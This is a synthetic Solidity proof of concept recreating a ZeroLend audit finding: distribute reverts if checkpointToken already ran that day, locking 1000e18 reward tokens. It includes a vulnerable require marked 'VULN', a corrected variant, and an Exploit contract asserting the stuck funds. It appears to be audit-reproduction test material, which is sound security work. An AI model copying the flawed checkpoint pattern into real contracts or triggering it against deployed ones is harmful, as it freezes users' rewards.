// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  ZeroLend — StakingEmissions.distribute reverts when checkpointToken
    was already called in the same day (Cantina Jan 2024, finding 40819).
    SYNTHETIC, cheatcode-free. The require is the audited line (@> VULN).
    Root cause: distribute always calls checkpointToken, and checkpointToken
    reverts unless a full TOKEN_CHECKPOINT_DEADLINE has passed since the last
    call. One checkpoint in the block sticks 1000e18 of rewards in staking.
    The fix skips the checkpoint when the deadline has not elapsed, and the
    user then receives the 1000e18. */

contract MockToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract FeeDistributor {
    uint256 public constant TOKEN_CHECKPOINT_DEADLINE = 1 days;
    uint256 public lastTokenTime;
    MockToken public token;
    bool public corrected;

    constructor(address _token, bool _corrected) {
        token = MockToken(_token);
        corrected = _corrected;
    }

    function checkpointToken() external {
        if (corrected) {
            if (block.timestamp > lastTokenTime + TOKEN_CHECKPOINT_DEADLINE) {
                _checkpointToken(block.timestamp);
            }
        } else {
            // @> VULN: a checkpoint already taken today makes this revert, so distribute cannot pay.
            require(block.timestamp > lastTokenTime + TOKEN_CHECKPOINT_DEADLINE, "cant checkpoint now");
            _checkpointToken(block.timestamp);
        }
    }

    function checkpointTotalSupply() external {}

    function _checkpointToken(uint256 ts) internal {
        lastTokenTime = ts;
    }

    function claim(address to) external {
        uint256 bal = token.balanceOf(address(this));
        if (bal > 0) {
            token.transfer(to, bal);
        }
    }
}

contract StakingEmissions {
    FeeDistributor public feeDistributor;
    MockToken public token;
    uint256 public constant amtPerEpoch = 1000e18;

    constructor(address _fees, address _token) {
        feeDistributor = FeeDistributor(_fees);
        token = MockToken(_token);
    }

    function distribute() external {
        feeDistributor.checkpointToken();
        feeDistributor.checkpointTotalSupply();
        token.transfer(address(feeDistributor), amtPerEpoch);
    }
}

contract Stack {
    MockToken public token;
    FeeDistributor public fees;
    StakingEmissions public staking;
    address public user;
    bool public distributed;

    constructor(bool corrected) {
        token = new MockToken("VestedZeroLend", "VZL");
        fees = new FeeDistributor(address(token), corrected);
        staking = new StakingEmissions(address(fees), address(token));
        user = address(uint160(uint256(keccak256("staker"))));
    }

    function go() external {
        token.mint(address(staking), amt());
        fees.checkpointToken();
        (bool ok,) = address(staking).call(abi.encodeWithSelector(staking.distribute.selector));
        distributed = ok;
        if (ok) {
            fees.claim(user);
        }
    }

    function amt() public pure returns (uint256) {
        return 1000e18;
    }
}

contract Exploit {
    Stack public stack;

    constructor() {
        stack = new Stack(false);
    }

    function run() external {
        stack.go();
        uint256 stuck = stack.token().balanceOf(address(stack.staking()));
        require(stack.distributed() == false, "distributed");
        require(stuck == 1000e18, "stuck");
        require(stack.token().balanceOf(stack.user()) == 0, "user");
        require(stack.fees().lastTokenTime() == block.timestamp, "checkpointed");
    }
}
